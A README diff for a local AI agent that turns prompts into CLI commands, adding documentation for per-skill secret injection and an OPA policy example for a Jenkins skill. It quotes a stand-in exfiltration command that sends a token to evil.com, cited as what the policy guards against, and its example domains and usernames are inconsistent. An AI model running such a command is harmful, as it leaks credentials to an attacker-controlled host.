@@ -17,6 +17,7 @@ A safe-to-use, local AI agent that turns natural-language prompts into CLI comma
   - [Installation](#installation)
   - [Quick start](#quick-start)
 - [Skills](#skills)
+- [Secrets](#secrets)
 - [OPA policy](#opa-policy)
 - [Configuration](#configuration)
 - [API reference](#api-reference)
@@ -175,6 +176,7 @@ policy: |
 | `description` | yes | — | Full description of how the agent should use this tool |
 | `enabled` | no | `true` | Whether the skill is active by default |
 | `policy` | no | `null` | Rego rule bodies (no `package` line) that gate command execution |
+| `env` | no | `[]` | List of secret names injected into the subprocess at execution time |
 
 Files in subdirectories are ignored — only top-level `.yaml` files are loaded.
 
@@ -183,6 +185,91 @@ Files in subdirectories are ignored — only top-level `.yaml` files are loaded.
 Open the Skills & Settings modal → **Remote skill repository** section. Enter the repository URL and branch, then click **Save repo settings**. The server will immediately clone and sync the remote skills.
 
 Remote skills appear with a **remote** badge in the UI and cannot be edited or deleted from the interface. Use the **Sync remote skills** button to pull the latest changes without restarting the server.
+
+---
+
+## Secrets
+
+Skills often need credentials (API tokens, passwords) to authenticate with external services. The agent supports **per-skill secret injection** that keeps credentials completely isolated from the LLM.
+
+### How it works
+
+1. Secrets are stored in `secrets.json` (never in process environment, never in git)
+2. Each skill declares which secrets it needs via the `env` field (a list of names)
+3. At execution time, the matched skill's secrets are resolved from the store and:
+   - Injected as environment variables into the subprocess
+   - Used to resolve `${VAR_NAME}` placeholders in the command arguments
+4. The LLM only ever sees the `${VAR_NAME}` placeholder — never the actual value
+
+### Security guarantees
+
+- **Secrets never enter `os.environ`** — even if a misconfigured skill allows `printenv` or `env`, nothing sensitive is exposed
+- **Per-skill scoping** — a skill can only access secrets listed in its own `env` field
+- **OPA policy is the guard** — the policy should restrict target domains to prevent exfiltration (e.g., `curl https://evil.com/?leak=${TOKEN}`)
+- **No API exposure** — secrets are managed via file only, not through the web UI or API
+
+### Setup
+
+Create `secrets.json` in the project root (it is gitignored automatically):
+
+```json
+{
+  "JENKINS_TOKEN": "your-actual-token",
+  "GITHUB_TOKEN": "ghp_xxxxxxxxxxxx"
+}
+```
+
+Set file permissions to restrict access:
+
+```sh
+chmod 600 secrets.json
+```
+
+### Using secrets in a skill
+
+Reference secret names in the skill's `env` field:
+
+```yaml
+name: jenkins-api
+description: |
+  Jenkins REST API access (read-only).
+  Environment variables available: ${JENKINS_TOKEN}.
+  Use ${VAR} syntax in arguments — values are injected at runtime.
+  Use --user agent:${JENKINS_TOKEN} for authentication.
+enabled: true
+env:
+  - JENKINS_TOKEN
+policy: |
+  argv_has(v) { input.argv[_] == v }
+  url_allowed {
+    val := input.argv[_]
+    contains(val, "my.jenkins.com")
+    not url_blocked(val)
+  }
+  url_blocked(val) { contains(val, "/credentials") }
+  url_blocked(val) { contains(val, "/script") }
+  url_blocked(val) { contains(val, "/config.xml") }
+  url_blocked(val) { contains(val, "/systemInfo") }
+  url_blocked(val) { contains(val, "/configure") }
+  url_blocked(val) { contains(val, "/env-vars") }
+  allow {
+    input.argv[0] == "curl"
+    argv_has("-k")
+    argv_has("-X")
+    argv_has("GET")
+    url_allowed
+  }
+```
+
+### What the LLM sees vs what actually runs
+
+| Stage | Content |
+|---|---|
+| **LLM generates** | `["curl", "-k", "-X", "GET", "--user", "agent:${JENKINS_TOKEN}", "https://corp.jenkins.com/api/json"]` |
+| **Stored in history** | Same as above (placeholder only) |
+| **Subprocess receives** | `curl -k -X GET --user username:actual-secret-value https://copr.jenkins.com/api/json` |
+
+The actual secret value exists only in the subprocess environment — never in LLM context, conversation history, or logs.
 
 ---
 
@@ -233,6 +320,7 @@ The policy receives `input.argv` — the proposed command as a list of strings. 
 | `MAX_ITERATIONS` | no | `10` | Maximum plan → validate → execute cycles per run |
 | `SKILLS_FILE` | no | `./skills.json` | Path where skills are persisted |
 | `RUNS_FILE` | no | `./runs.json` | Path where run history is persisted |
+| `SECRETS_FILE` | no | `./secrets.json` | Path to the secrets store (JSON, chmod 600) |
 | `COMMAND_TIMEOUT_SECONDS` | no | `30` | Seconds before a running command is killed |
 
 > **Remote skill repository** is now configured via the UI (Settings modal → Remote skill repository), not via environment variables.
